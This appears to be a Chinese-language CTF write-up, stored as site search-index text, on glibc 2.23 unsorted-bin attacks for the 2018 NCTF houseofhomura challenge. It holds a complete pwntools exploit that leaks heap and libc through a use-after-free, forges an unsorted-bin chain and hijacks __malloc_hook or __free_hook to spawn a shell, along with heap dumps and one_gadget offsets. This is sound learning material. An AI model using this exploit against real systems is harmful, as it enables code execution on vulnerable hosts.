add(0x10, E *0xF, (0xa0+0x20+0xa0), e *0x20) # 3 add(0x10, F *0xF, 0x80, f *0x20) # 4 delete(3) add(0, , 0, ) # 5 add(0, , 0, ) # 6 libc.address = leak(5, 0, ) - 88 - 0x3c4b20 success( libc , libc.address) pause() \u6784\u9020 fake unsorted bin \u94fe \u5982\u679c\u6700\u540e\u80fd\u628a\u4e00\u4e2a P \u4e2d\u6307\u5411 message \u7684\u6307\u9488\u53d8\u6210\u81ea\u5df1\u53ef\u63a7\uff0c\u5c82\u4e0d\u7f8e\u54c9\u3002\u8fd9\u4e00\u4e2a\u5229\u7528\u624b\u6cd5\u5b9e\u5728\u592a\u5f3a\u4e86[\u5230\u4e86 libc2.27 \u5c31\u7b49\u7740\u6b7b\u5427 orz \u5728\u5b98\u65b9\u7684 exp \u4e2d\u901a\u8fc7\u8bbe\u8ba1\uff0c\u5c06\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 name \u7684\u5757\uff0c\u653e\u5165\u4e86unsorted bin \u94fe\u4e2d\uff0c\u7136\u540e\u901a\u8fc7 unsorted bin \u7684 sort \u7684\u673a\u5236\uff0c\u88ab\u653e\u5165\u4e86 small bins \u4e2d\uff0c\u4e00\u4e2a name \u7684 chunk \u5373\u5c06\u53d8\u6210\u53e6\u4e00\u4e2a add() \u4e2d\u7684 struct P \u60f3\u60f3\u5c31\u6fc0\u52a8 \u60f3\u60f3\u9700\u8981\u6ee1\u8db3\u4e9b\u4ec0\u4e48\u6761\u4ef6\uff0c\u6700\u8d77\u7801 bk \u7684\u94fe\u9700\u8981\u5faa\u73af\uff0cfd \u7684\u94fe\u5219\u4e0d\u7528\uff0cunsorted_bins(av)- bk \u7684 fd \u5fc5\u987b\u662f main_arena+88 \uff0c\u5bf9\u4e8e unsorted_bins(av)- bk \u5fc5\u987b\u6307\u5411\u9700\u8981\u6784\u9020\u94fe\u7684\u6700\u4e0b\u9762\u90a3\u4e2a chunk \u3002\u4e0d\u59a8\u5c06 unsorted_bins(av) \u7684|fd bk| \u770b\u6210\u4e00\u4e2achunk, chunk A\uff0c unsorted bins \u94fe\u4e2d\u95f4\u4e00\u5757\u770b\u6210 chunk B\uff0cunsorted_bins(av)- bk \u770b\u6210 chunk C \u76ee\u6807\uff1a unsorted bins A = B = C A.bk == C C.bk == B B.bk == A (main_arena+88) C.fd == A (main_arena+88) \u6700\u96be\u5904\u7406\u7684\u5730\u65b9\u5728\u4e8e\uff0c\u6211\u4eec\u9700\u8981\u8ba9 name \u7684\u90a3\u4e2a chunk \u6bd4 \u6b63\u89c4\u7684 unsorted bins \u5148\u51fa\u53bb\uff0c\u5426\u5219 name \u90a3\u4e2a chunk \u4f1a\u56e0\u4e3a unosrted bins \u7684\u673a\u5236\u4e0d\u80fd\u88ab sort \u51fa\u53bb\uff0c\u90a3\u4e48 unsorted bins (av)- bk == fake (name chunk) \uff0c\u4f46\u662f\u5728 unsorted bins \u7684 malloc \u7684\u65f6\u5019\uff0c\u5c06 unsorted_bins (av)- bk \u8fd9\u4e2a chunk \u7684 bk \u503c\u6539\u53d8\uff0cunsorted_bins (av) \u7684 bk \u503c\u4e5f\u5c31\u80fd\u53d8\u4e86\uff0c\u6240\u4ee5 \u4f2a\u9020\u4e00\u4e2a unsorted_bins (av)- bk \u7684\u5047 bk \u503c\u3002 exp : main_arena = libc.address + 0x3c4b20 system = libc.sym[ system ] __malloc_hook = libc.sym[ __malloc_hook ] __free_hook = libc.sym[ __free_hook ] # one_gadget = libc.address + 0xf02a4 / 0xf1147 both can get shell one_gadget = libc.address + 0xf1147 log.info( hijack unsorted bin ) delete(5) modify(5, 0x20, p64(heap_base+0x20)*2) add(0x10, G *0xF, 0x80, p64(main_arena+88)*4) modify(0, 0x20, \\x90 *0x20) delete(0) add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4) gdb \u8c03\u8bd5 delete(5) modify() pwndbg parseheap addr prev size status fd bk 0x55c846963000 0x0 0x20 Used None None 0x55c846963020 0x0 0x20 Used None None 0x55c846963040 0x0 0xa0 Used None None 0x55c8469630e0 0xa0 0x20 Used None None 0x55c846963100 0x0 0x20 Used None None 0x55c846963120 0x0 0xa0 Used None None 0x55c8469631c0 0xa0 0x20 Used None None 0x55c8469631e0 0x0 0x20 Used None None 0x55c846963200 0x0 0xa0 Used None None 0x55c8469632a0 0x0 0x20 Used None None 0x55c8469632c0 0x0 0x20 Used None None 0x55c8469632e0 0x0 0xa0 Used None None 0x55c846963380 0x0 0x20 Freed 0x55c8469633a0 None 0x55c8469633a0 0x0 0x20 Freed 0x0 None 0x55c8469633c0 0x0 0xa0 Freed 0x7fa141c14b78 0x7fa141c14b78 0x55c846963460 0xa0 0x20 Used None None 0x55c846963480 0x0 0x20 Used None None 0x55c8469634a0 0x0 0xa0 Used None None 0x55c8469633c0 0x0 0xa0 Freed 0x55c846963020 0x55c846963020 add() modify(0) modify(0) \u4ec5\u4ec5\u662f\u4e3a\u4e86\u8ba9 0x2020E0 \u8bb0\u5f55 Array[0] pwndbg p main_arena $1 = { mutex = 0, flags = 0, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, top = 0x55c846963540, last_remainder = 0x55c8469633c0, bins = {0x55c8469633c0, 0x55c846963020, 0x7fa141c14b88 main_arena+104 , 0x7fa141c14b88 main_arena+104 , 0x7fa141c14b98 main_arena+120 , 0x7fa141c14b98 main_arena+120 , 0x7fa141c14ba8 main_arena+136 , 0x7fa141c14ba8 main_arena+136 , 0x7fa141c14bb8 main_arena+152 , 0x7fa141c14bb8 main_arena+152 , 0x7fa141c14bc8 main_arena+168 , 0x7fa141c14bc8 main_arena+168 , 0x7fa141c14bd8 main_arena+184 , 0x7fa141c14bd8 main_arena+184 , 0x7fa141c14be8 main_arena+200 ...}, binmap = {16777216, 0, 0, 0}, next = 0x7fa141c14b20 main_arena , next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168 } delete(0) add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4) \u8fdb\u884c unsorted bin bk \u7684\u5faa\u73af\u95ed\u5408 \u8fd9\u4e2a\u5730\u65b9\u6211\u6ca1\u4e0b\u65ad\u70b9\u4e0b\u597d\uff0c\u8bb2\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u5230\u4e86\u8fd9\u4e00\u6b65\u5427\uff0c\u5728 add() \u4e2d\uff0c malloc(0x10) \u4e4b\u540e malloc(0x10) \uff0c\u8fd9\u4e2a\u5c31\u662f heap_base + 0x20 \u5373 \u4e0a\u9762\u8bb2\u7684 chunk C \u5728\u904d\u5386 unsorted bins \u65f6\uff0c\u4f1a\u5148\u5c06 0x20 \u62ff\u51fa\u6765\uff0c\u518d\u628a unsorted bins \u62ff\u51fa\u6765 unsorted_bins(av)- bk = (0x20) (0x20).fd = unsorted_bins(av) / main_arena+88 (0x20).bk = (0x120) (0x120).bk = unsorted_bins(av) / main_arena+88 (0x120).fd = unsorted_bins(av) / main_arena+88 pwndbg parseheap addr prev size status fd bk 0x55c846963000 0x0 0x20 Freed 0x55c846963020 None 0x55c846963020 0x0 0x20 Freed 0x0 None 0x55c846963040 0x0 0xa0 Used None None 0x55c8469630e0 0xa0 0x20 Used None None 0x55c846963100 0x0 0x20 Used None None 0x55c846963120 0x0 0xa0 Freed 0x55c8469633c0 0x7fa141c14b78 \u795e\u5947\u7684\u73b0\u8c61\u53d1\u751f\u4e86 pwndbg heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55c846963540 (size : 0x20ac0) last_remainder: 0x55c8469633c0 (size : 0xa0) unsortbin: 0x0 (0x020) smallbin[ 0]: 0x55c846963020 \u5f00\u5f00\u5fc3\u5fc3 hijack \u6211\u8bd5\u4e86\u4e24\u79cd\uff0c\u4e00\u79cd hijack __malloc_hook = one_gadget \u53e6\u5916\u4e00\u79cd __free_hook = system \uff0c\u90fd\u53ef\u884c exp1 # one_gadget = libc.address + 0xf02a4 / 0xf1147 both can get shell one_gadget = libc.address + 0xf1147 # exp 1 : hijack __malloc_hook = one_gadget log.info( last step : hijack __malloc_hook = one_gadget ) add(0x10, 1 *0x10, 0x80, 1 *0x20) delete(0) add(0x10, p64(__malloc_hook)*2, 0x80, get shell ) edit_len_0(6, p64(one_gadget), p64(one_gadget)) pause() log.info( Get shell ) io.sendlineafter( , 1 ) exp2 # exp 2 : hijack __free_hook = system log.info( last step : hijack __free_hook = system ) add(0x10, 1 *0x20, 0x80, /bin/sh\\x00 ) delete(0) add(0x10, /bin/sh\\x00 + p64(__free_hook), 0x80, /bin/sh\\x00 ) edit_len_0(6, p64(system), p64(system)) pause() log.info( Get shell ) delete(0) \u5b8c\u6574 exp #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from time import sleep import os import sys elfPath = ./homura libcPath = ./libc-2.23.so Addr = Port = 0 context.log_level = debug context.binary = elfPath elf = context.binary if sys.argv[1] == l : io = process(elfPath) libc = elf.libc else: if sys.argv[1] == d : io = process(elfPath, env = { LD_PRELOAD : libcPath}) context.log_level = info else : io = remote(Addr, Port) context.log_level = info if libcPath: libc = ELF(libcPath) success = lambda name, value: log.success( {} - {:#x} .format(name, value)) def add(lenth, name, size, message): io.sendlineafter( , 1 ) io.sendlineafter( name: , str(int(lenth))) if lenth != 0: io.sendlineafter( name: , name) io.sendlineafter( message: , str(int(size))) io.sendlineafter( message: , message) def delete(idx): io.sendlineafter( , 2 ) io.sendlineafter( index: , str(idx)) def modify(idx, size, message): io.sendlineafter( , 3 ) io.sendlineafter( index: , str(idx)) io.sendlineafter( size: , str(int(size))) if size != 0: io.sendlineafter( , message) def leak(idx, size, message): io.sendlineafter( , 3 ) io.sendlineafter( index: , str(idx)) io.sendlineafter( size: , str(int(size))) io.recvuntil( \\x20 ) value = u64(io.recvuntil( \\x20 , drop=True).ljust(8, \\x00 )) if size != 0: io.sendlineafter( , message) return value def edit_len_0(idx, s, v2): io.sendlineafter( , 5 ) io.sendlineafter( index: , str(idx)) io.sendlineafter( message , s) io.sendlineafter( ! , v2) if __name__ == __main__ : [*] Test case 5: pause() add(0x10, A *0xF, 0x80, a *0x20) vuln(0, B *0x7, b *0x1F) log.info( leak heap ) add(0x10, A *0xF, 0x80, a *0x20) # 0 add(0x10, B *0xF, 0x80, b *0x20) # 1 add(0x10, C *0xF, 0x80, c *0x20) # 2 modify(0, 0x21, a *0x20) delete(1) delete(0) add(0, , 0, ) heap_base = leak(0, 0, ) - 0xe0 success( heap , heap_base) pause() log.info( leak libc ) add(0x10, D *0xF, 0x80, d *0x20) # 1 add(0x10, E *0xF, (0xa0+0x20+0xa0), e *0x20) # 3 add(0x10, F *0xF, 0x80, f *0x20) # 4 delete(3) add(0, , 0, ) # 5 add(0, , 0, ) # 6 libc.address = leak(5, 0, ) - 88 - 0x3c4b20 success( libc , libc.address) pause() # log.info( hijack global_max_fast ) # global_max_fast 0x7f6c5d5b87f8 # libc 0x7f6c5d1f2000 # global_max_fast = libc.address + 0x3c67f8 # _IO_list_all = libc.sym[ _IO_list_all ] 0x45216 execve( /bin/sh , rsp+0x30, environ) constraints: rax == NULL 0x4526a execve( /bin/sh , rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf02a4 execve( /bin/sh , rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1147 execve( /bin/sh , rsp+0x70, environ) constraints: [rsp+0x70] == NULL main_arena = libc.address + 0x3c4b20 system = libc.sym[ system ] __malloc_hook = libc.sym[ __malloc_hook ] __free_hook = libc.sym[ __free_hook ] # one_gadget = libc.address + 0xf02a4 / 0xf1147 both can get shell one_gadget = libc.address + 0xf1147 log.info( hijack unsorted bin ) delete(5) modify(5, 0x20, p64(heap_base+0x20)*2) add(0x10, G *0xF, 0x80, p64(main_arena+88)*4) modify(0, 0x20, \\x90 *0x20) delete(0) add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4) # exp 1 : hijack __malloc_hook = one_gadget log.info( last step : hijack __malloc_hook = one_gadget ) add(0x10, 1 *0x10, 0x80, 1 *0x20) delete(0) add(0x10, p64(__malloc_hook)*2, 0x80, get shell ) edit_len_0(6, p64(one_gadget), p64(one_gadget)) pause() log.info( Get shell ) io.sendlineafter( , 1 ) # exp 2 : hijack __free_hook = system log.info( last step : hijack __free_hook = system ) add(0x10, 1 *0x20, 0x80, /bin/sh\\x00 ) delete(0) add(0x10, /bin/sh\\x00 + p64(__free_hook), 0x80, /bin/sh\\x00 ) edit_len_0(6, p64(system), p64(system)) pause() log.info( Get shell ) delete(0) io.interactive() io.close()","title":"heap/unsorted bin"},{"location":"pwn/unsorted-bin/#unsorted-bin","text":"","title":"Unsorted bin"},{"location":"pwn/unsorted-bin/#malloc","text":"static void * _int_malloc (mstate av, size_t bytes) // mstate \u4e3a main_arena \u7ed3\u6784\u4f53 { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ // Covert request size to normalized request size checksed_request2size(bytes, nb); ... for(;;) { int iters = 0; while ((victim = unsorted_chunks (av)- bk) != unsorted_chunks(av)) // unsorted_chunk (av) \u4e3a main arena + 88 \u5373 main arena \u4e2d\u5b58\u50a8 unsorted bin fd bk \u7684\u5730\u65b9 { bck = victim- bk; // victim \u4e3a\u5c06\u88ab\u4ece unsorted bin \u94fe\u4e0a\u53d6\u4e0b\u6765\u7684\u90a3\u4e00\u5757 size = chunksize(victim); mchunkptr next = chunk_at_offset (victim, size); ... / * glibc2.27 add the check glibc2.23 doesn t have this check if (__glibc_unlikely (bck- fd != victim) || __glibc_unlikely (victim- fd != unsorted_chunks (av))) malloc_printerr ( mallloc(): unsorted double linked list corrupted ); if (__libc_unlikely (prev_inuse (next))) malloc_printerr ( malloc(): invalid next- prev_inuse (unsorted) ); */ // if a small request , try to ues last remainder if it is the only chunk in unosrted bin. if (in_samllbin_range (nb) bck == unsorted_chunks (av) victim == av- last_remainder (unsigned long) (size) (unsigned long) (nb + MINSIZE)) {...} /* remove from unsorted list */ if (__glibc_unlikely (bck- fd != victim)) malloc_printerr( malloc(): corrupted unsorted chunks 3 ); unsorted_chunks (av)- bk = bck; bck- fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ // because size fits ,so after setting some values or checking some values, it returns p if (size == nb) { ... return p; } /* place chunk in bin */ if (in_samllbin_range (size)) { victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck- fd; } else { victim_index = largenbin_index(size); bck = bin_at (av, victim_index); fwd = bck- fd; /* maintain large bins in sorted order */ if (fwd != bck) {...} else {...} } mark_bin(av, victim_index); victim- bk = bck; victim- fd = fwd; fwd- bk = victim; bck- fd = victim; #define MAX_ITERS 10000 if (iters = MAX_ITERS) break; } /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range(nb)) {...} else {...} ... use top : ... ... } } \u4e0a\u8ff0\u4ee3\u7801\u4e2d // \u6ce8\u91ca\u7684\u4e3a\u7b14\u8005\u52a0\u7684\u6ce8\u91ca\uff0c/* */ \u4e3a\u4ee3\u7801\u4e2d\u539f\u751f\u6ce8\u91ca\uff0c\u82f1\u6587\u5199\u7684 // \u4e3a\u7b14\u8005\u4e3a\u4fbf\u4e8e\u7406\u89e3 unsorted bin \u7684\u5927\u6846\u67b6\u7b80\u5199\u4e86\u4ee3\u7801\u4e2d\u539f\u751f\u6ce8\u91ca \u5728\u7b14\u8005\u770b\u6765\uff0cunsorted bin \u4e2d\u53d6\u4e0b victim \u90a3\u4e00\u5757\u65f6 \uff0cvictim \u7684 bk \u53ef\u4ee5\u79f0\u5f97\u4e0a\u662f unsorted bin malloc \u7684\u53d1\u8d77\u70b9\uff0c\u76f8\u53cd victim \u7684 fd \u751a\u81f3\u57fa\u672c\u6beb\u65e0\u63d0\u53ca\u3002\u5728\u68c0\u6d4b\u5f88\u5c11\u7684 unsorted bin \u7684 malloc \uff0c\u5982\u679c\u80fd\u4fee\u6539 free \u6389\u7684 unsorted bin \u7684 bk\uff0c\u5c06 unsorted bin \u7684 bk \u6539\u6210 \u76ee\u6807\u5730\u5740-0x10\uff0c\u90a3\u4e48\u5c31\u80fd\u5728 fake_bk+0x10 \u7684\u5730\u5740\u4e0a\u5199\u4e0a (main arena+88) \u7684\u503c\uff0c\u6bd4\u5982\u5c06 global_max_fast \u7684\u503c\u6539\u5927\uff0c\u5219\u4e4b\u540e\u7684 chunk \u7684 malloc \u548c free \u7686\u53d8\u6210\u4e86 fastbin \u7684 malloc \u548c free\uff0c\u4f46\u662f unsorted bin \u7684\u673a\u5236\u57fa\u672c\u53ef\u4ee5\u8bf4\u662f\u5e9f\u6389\u4e86\uff0c\u518d\u4f7f\u7528\u4fbf\u4f1a crash\u3002 \u4e3b\u6d41\u7684\u4e24\u79cd unsorted bin attack \uff0c\u4e00\u79cd\u662f\u66f4\u6539 global_max_fast \u53e6\u4e00\u79cd\u662f house of orange \u4e2d\u66f4\u6539 _IO_list_all (\u8fd9\u4e2a\u6211\u8fd8\u6ca1\u641e\u61c2\uff0c\u7559\u5751=.=) \u5b66\u957f\u8bf4\u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u5178\u578b\u7684 attack , house of roman \u4e5f\u662f\u7528\u7684\u8fd9\u4e2a\u529e\u6cd5\uff0c\u7565\u5fae\u770b\u4e86\u4e00\u4e0b\uff0c\u57fa\u672c\u601d\u60f3\u5c31\u662f\uff0c\u80fd\u591f\u5c06 main_arena+88 \u5199\u5165 __malloc_hook \u7136\u540e\u8fdb\u884c\u66f4\u6539\u540e3\u4e2a\u5b57\u8282\uff0c\u89e6\u53d1 malloc_printerr \u4ece\u800c getshell (\u7559\u5751)","title":"malloc"},{"location":"pwn/unsorted-bin/#free","text":"__int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ ... if (nextchunk != av- top) { ... /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck- fd; if (__glibc_unlikely (fwd- bk != bck)) malloc_printerr ( free(): corrupted unsorted chunks ); p- fd = fwd; p- bk = bck; if (!in_smallbin_range(size)) { p- fd_nextsize = NULL; p- bk_nextsize = NULL; } bck- fd = p; fwd- bk = p; ... } ... } unsorted bin \u7684 free \u5c31\u6734\u5b9e\u5f88\u591a\uff0c\u8ddf\u6b63\u5e38\u7684\u53cc\u5411\u94fe\u8868\u6ca1\u4ec0\u4e48\u533a\u522b\u3002","title":"free"},{"location":"pwn/unsorted-bin/#2018-nctf-houseofhomura","text":"","title":"2018 NCTF houseofhomura"},{"location":"pwn/unsorted-bin/#_1","text":"\u8fd9\u4e2a\u9898\u76ee\u662f glibc2.23 \uff0c\u5728 glibc2.23 \u4e2d\u8fde check(victim- bk- fd == victim) \u90fd\u6ca1\uff0c\u800c\u6bcf\u6b21\u5c06\u94fe\u8868\u4e2d chunk \u62ff\u51fa\u6765\u4e4b\u540e\uff0c\u662f\u7528 unsorted_bins(av)- bk \u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5373\u4f7f\u53cc\u5411\u94fe\u8868\u4e2d fd \u9664 unsorted_bins(av)- fd \u4ee5\u5916\u90fd\u662f\u9519\u8bef\u7684\uff0c\u5982\u679c unsorted_bins(av)- bk \u7684 fd \u662f\u6307\u5411 main_arena+88 \u7684\u4f4d\u7f6e\u7684\uff0c\u904d\u5386 unsorted bins \u7684\u53cc\u5411\u94fe\u8868\u65f6\uff0cvictim- bk- fd \u6bcf\u6b21\u90fd\u662f\u88ab\u52a8\u88ab\u8d4b\u503c\u6210 unsorted_bins(av)- fd \uff0c\u56e0\u6b64\u4e00\u5c42\u4e00\u5c42\u904d\u5386\u4e0b\u6765\uff0c fd \u90fd\u4f1a\u88ab\u8d4b\u503c\u6210\u76f8\u540c\u7684\u503c \uff08\u867d\u7136\u6211\u8fd8\u662f\u60f3\u9ed8\u9ed8\u5410\u69fd\u4e00\u4e0b\uff0cNCTF 2018 \u8fd9\u9898\u5b98\u65b9 exp \u5199\u7684\u6beb\u65e0\u6ce8\u89e3\uff0c\u4f46\u662f\u8fd8\u662f\u5f88\u5de7\u5999\u7684\uff0c\u8fd9\u4e00\u9898 unsorted bin \u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u786e\u5b9e\u5728 Google \u4e2d\u6ca1\u6709\u641c\u51fa\u6765[\u641c\u5230\u6700\u540e\uff0c\u518d\u641c\u7684\u65f6\u5019\uff0cGoogle \u4e00\u4e2a\u7248\u9762\u90fd\u663e\u793a\u4f60\u5168\u770b\u8fc7]\uff0c\u4e0d\u5f97\u5df2\u6700\u540e\u53bb\u8c03\u8bd5\u4e86\u4e00\u53d1\u5b98\u65b9 exp [\u6700\u540e\u611f\u89c9\u5b98\u65b9 exp \u8fd8\u662f\u5199\u590d\u6742\u4e86\uff0c\u4e0d\u8fc7\u5df2\u7ecf\u5f88\u826f\u5fc3\u4e86\uff0c\u4e00\u4e9b\u6bd4\u8d5b\u8fde exp \u90fd\u6ca1]\uff09","title":"\u524d\u8a00"},{"location":"pwn/unsorted-bin/#_2","text":"","title":"\u529f\u80fd"},{"location":"pwn/unsorted-bin/#add","text":"\u6bcf\u4e00\u6b21 add() \u90fd\u4f1a\u4ea7\u751f\u4e09\u4e2a chunk \u5148 malloc(0x10) \u7528\u6765\u7ba1\u7406\u4e4b\u540e malloc \u7684\u4e24\u4e2a chunk struct P { char* name; char* message; } \u4e4b\u540e\u4e24\u4e2a chunk \u9650\u5236\u5927\u5c0f\uff0cname \u6700\u5927 malloc(0x10)\uff0cmessage \u6700\u5c0f malloc(0x80+0x10) void add() { struct P *v0; // rbx struct P *v1; // rbx signed int i; // [rsp+4h] [rbp-1Ch] int v3; // [rsp+8h] [rbp-18h] int v4; // [rsp+Ch] [rbp-14h] for ( i = 0; i = 14 Array[i]; ++i ) ; if ( i = 14 ) { Array[i] = (struct P *)malloc(0x10uLL); v0 = Array[i]; v0- name = (char *)malloc(0x10uLL); printf( length of your name: ); v3 = Atoi(); if ( v3 15 ) v3 = 16; printf( your name: ); Read(Array[i]- name, v3); printf( size of your message: , (unsigned int)v3); v4 = Atoi(); if ( v4 = 0x80 || v4 0xFFF ) v4 = 0x80; v1 = Array[i]; v1- message = (char *)malloc(v4 + 16); printf( please leave your message: ); Read(Array[i]- message, v4); puts( Done! ); } else { puts( full! ); } }","title":"add()"},{"location":"pwn/unsorted-bin/#delete","text":"\u5220\u9664\u7684\u65f6\u5019\uff0c\u4f1a\u6e05\u7a7a Arrray[v0]\uff0c\u4f46\u662f\u6ca1\u6e05\u7a7a struct P \u4e2d\u4e24\u4e2a\u6307\u9488\uff08UAF\uff09 void delete() { int v0; // [rsp+Ch] [rbp-4h] printf( index: ); v0 = Atoi(); if ( v0 = 0 v0 = 14 ) { free(Array[v0]- name); free(Array[v0]- message); free(Array[v0]); Array[v0] = 0LL; puts( Done! ); } else { puts( invalid ); } }","title":"delete()"},{"location":"pwn/unsorted-bin/#modify","text":"\u6f0f\u6d1e\u5c31\u51fa\u5728\u8fd9\u91cc\uff0c\u552f\u4e00\u53ef\u4ee5\u6253\u5370\u7684\u5730\u65b9\uff0c\u4ee5\u53ca\u552f\u4e00\u53ef\u4ee5\u4fee\u6539\u7684\u5730\u65b9\uff08\u5176\u5b9e\u4e0d\u662f\u552f\u4e00\u53ef\u4ee5\u4fee\u6539\u7684\u5730\u65b9\uff09 \u53ef\u4ee5\u60f3\u5230\uff0c\u5982\u679c\u5728 delete() \u4e4b\u524d modify() \u4e86\uff0c\u90a3\u4e48\u8be5 struct P \u6307\u9488\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5728 qword_2020E0 \u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u53c8\u56e0\u4e3a delete \u4e4b\u540e\u53ef\u4ee5 UAF\uff0c\u6240\u4ee5\u80fd\u66f4\u6539\u88ab free \u4e4b\u540e message \u90a3\u4e00\u5757\u7684\u503c\uff0c\u540c\u6837\u56e0\u4e3a UAF\uff0c\u5373\u5c06\u88ab malloc \u5757\u7684\uff08\u4e0d\u5305\u542b\u5934\u7684\uff09\u524d8\u4e2a\u5b57\u8282\u4e0a\u9762\u6709\u503c\uff0c\u5373\u539f\u6765\u6b8b\u7559\u7684 fd \uff0c\u7136\u540e\u5728 add \u7684\u65f6\u5019\uff0c\u8f93\u5165\u7a7a\uff08\"\"\uff09\u90a3\u4e48\u5c31\u80fd\u6cc4\u9732 heap base \u548c libc base \uff0c\u4e00\u4e2a\u901a\u8fc7 fastbin \u7684 fd \u6cc4\u9732\uff0c\u4e00\u4e2a\u901a\u8fc7 unsorted bin \u7684 fd \u6cc4\u9732 libc \u5bf9\u4e8e\u88ab free \u6389\u7684 unsorted bin \u53ef\u4ee5\u66f4\u6539 fd bk \u5f62\u6210 fake unsorted bin \u94fe void modify() { int v0; // [rsp+8h] [rbp-18h] int v1; // [rsp+Ch] [rbp-14h] printf( index: ); v1 = Atoi(); if ( v1 = 0 v1 = 14 ) { if ( Array[v1] ) qword_2020E0 = Array[v1]; if ( qword_2020E0 ) { printf( size: ); v0 = Atoi(); if ( v0 strlen(qword_2020E0- message) ) v0 = 16; printf( Hello %s you can modify your message , qword_2020E0- name); Read(qword_2020E0- message, v0); puts( Done! ); } } else { puts( invalid ); } }","title":"modify()"},{"location":"pwn/unsorted-bin/#edit_len_0","text":"modify \u8ddf edit_len_0 \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\uff0cmodify \u6839\u636e strlen(message) \u518d\u6b21\u8f93\u5165\uff0c\u800c edit_len_0 \u53ef\u4ee5\u5728 len = 0 \u65f6\uff0c\u8fdb\u884c\u590d\u5199 void edit_len_0() { int v0; // [rsp+Ch] [rbp-34h] char s; // [rsp+10h] [rbp-30h] __int64 v2; // [rsp+28h] [rbp-18h] unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); if ( vuln_argv == 0xDEADBEEF ) { vuln_argv = 0; printf( index: ); v0 = Atoi(); if ( v0 = 0 v0 = 14 ) { if ( Array[v0] ) qword_2020E0 = Array[v0]; if ( qword_2020E0 ) { printf( modify your message ); memset( s, 0, 0x28uLL); Read( s, 8u); printf( Here you can modify once again! , 8LL); Read((char *) v2, 8u); memcpy(qword_2020E0- message, s, 0x20uLL); puts( Done! ); } } else { puts( invalid ); } } }","title":"edit_len_0"},{"location":"pwn/unsorted-bin/#_3","text":"","title":"\u5206\u6790"},{"location":"pwn/unsorted-bin/#leak-heap-libc","text":"add() \u4e09\u6b21 chunk : 0x20 0x20 0xa0 | 0x20 0x20 0xa0 | 0x20 0x20 0xa0 \u7136\u540e delete(1) delete(0) \u518d add() \u7684\u65f6\u5019\uff0cname = \"\" \u901a\u8fc7 modify() \u6253\u5370\uff0c\u6cc4\u9732\u51fa heap base libc \u5219\u901a\u8fc7\u5148 add() \u4e00\u4e2a\u5927\u5757\uff0c\u7136\u540e delete() \u4e4b\u540e\uff0cadd() \u5c0f\u5757\uff0c\u5c0f\u5757\u4f1a\u5207\u5206\u5927\u5757 unsorted bin \uff0c\u4ece\u800c leak libc log.info( leak heap ) add(0x10, A *0xF, 0x80, a *0x20) # 0 add(0x10, B *0xF, 0x80, b *0x20) # 1 add(0x10, C *0xF, 0x80, c *0x20) # 2 modify(0, 0x21, a *0x20) delete(1) delete(0) add(0, , 0, ) heap_base = leak(0, 0, ) - 0xe0 success( heap , heap_base) pause() log.info( leak libc ) add(0x10, D *0xF, 0x80, d *0x20) # 1 add(0x10, E *0xF, (0xa0+0x20+0xa0), e *0x20) # 3 add(0x10, F *0xF, 0x80, f *0x20) # 4 delete(3) add(0, , 0, ) # 5 add(0, , 0, ) # 6 libc.address = leak(5, 0, ) - 88 - 0x3c4b20 success( libc , libc.address) pause()","title":"leak heap &amp; libc"},{"location":"pwn/unsorted-bin/#fake-unsorted-bin","text":"\u5982\u679c\u6700\u540e\u80fd\u628a\u4e00\u4e2a P \u4e2d\u6307\u5411 message \u7684\u6307\u9488\u53d8\u6210\u81ea\u5df1\u53ef\u63a7\uff0c\u5c82\u4e0d\u7f8e\u54c9\u3002\u8fd9\u4e00\u4e2a\u5229\u7528\u624b\u6cd5\u5b9e\u5728\u592a\u5f3a\u4e86[\u5230\u4e86 libc2.27 \u5c31\u7b49\u7740\u6b7b\u5427 orz \u5728\u5b98\u65b9\u7684 exp 